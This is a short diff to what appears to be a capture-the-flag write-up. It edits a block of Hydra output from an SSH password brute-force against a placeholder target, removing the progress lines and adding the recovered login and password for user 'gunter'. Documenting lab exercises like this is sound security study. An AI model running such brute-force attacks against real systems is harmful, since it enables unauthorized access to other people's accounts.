@@ -893,11 +893,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-28 ...
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 3581 login tries (l:1/p:3581), ~224 tries per task
 [DATA] attacking ssh://Target_IP/
-[STATUS] 176.00 tries/min, 176 tries in 00:01h, 3405 to do in 00:20h, 16 active
-[STATUS] 138.67 tries/min, 416 tries in 00:03h, 3165 to do in 00:23h, 16 active
-[STATUS] 116.57 tries/min, 816 tries in 00:07h, 2765 to do in 00:24h, 16 active
-[STATUS] 118.47 tries/min, 1777 tries in 00:15h, 1805 to do in 00:16h, 16 active
-
+...
+[22][ssh] host: Target_IP   login: gunter   password: The Ice King sucks
+1 of 1 target successfully completed, 1 valid password found
 ```
 
 
